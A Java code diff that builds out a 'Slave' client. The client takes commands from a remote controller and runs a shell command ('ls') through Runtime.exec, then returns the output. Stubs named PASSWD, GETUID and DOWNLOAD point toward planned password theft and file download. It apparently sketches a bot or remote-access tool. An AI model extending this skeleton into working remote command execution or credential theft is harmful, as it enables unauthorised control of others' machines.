@@ -49,14 +49,13 @@ public class Slave
     if (!sender.Connect()) {
       return;
     }
-    // Read in the commands sent from Master
+
     while (true) {
+      // Read and action
       sender.Read();
-      // Reply to the commands
-      sender.Reply();
       // Sleep to avoid spam
-      int sleepTime = 1000; //milliseconds
-      Thread.sleep(sleepTime);
+      int sleepTime = 3000; //milliseconds
+      //Thread.sleep(sleepTime);
     }
   }
 
@@ -88,19 +87,60 @@ public class Slave
       return;
     }
     // Reads commands from Controller
-    String command = in.readLine();
-    System.out.println("Command: "+ command);
+    String command = null;
+    do {
+      command = in.readLine();
+      System.out.println("Received: "+ command);
+    } while (command == null);
     // use method action();
     action(command);
   }
 
-  void action(String command) {
-
+  void action(String command) throws IOException {
+    if (command.equals("VERSION")) {
+      Reply(executeCommand("ls"));
+    }
+    else if (command.equals("PASSWD")) {
+      Reply("<passwd>");
+    }
+    else if (command.equals("GETUID")) {
+      Reply("<UID>");
+    }
+    else if (command.equals("DOWNLOAD")) {
+      Reply("<DL'd>");
+    }
+    else {
+      System.out.println("Invalid command received.");
+    }
   }
 
-  void Reply() throws IOException {
-    out.println("<reply>");
+  void Reply(String output) throws IOException {
+    out.println(output);
     out.flush();
+  }
+
+  public String executeCommand(String command) {
+
+    StringBuffer output = new StringBuffer();
+
+    Process p;
+    try {
+      p = Runtime.getRuntime().exec(command);
+      p.waitFor();
+      BufferedReader reader =
+                      new BufferedReader(new InputStreamReader(p.getInputStream()));
+
+      String line = "";
+      while ((line = reader.readLine())!= null) {
+          output.append(line + " | ");
+      }
+
+    } catch (Exception e) {
+        e.printStackTrace();
+    }
+
+    return output.toString();
+
   }
 
 }
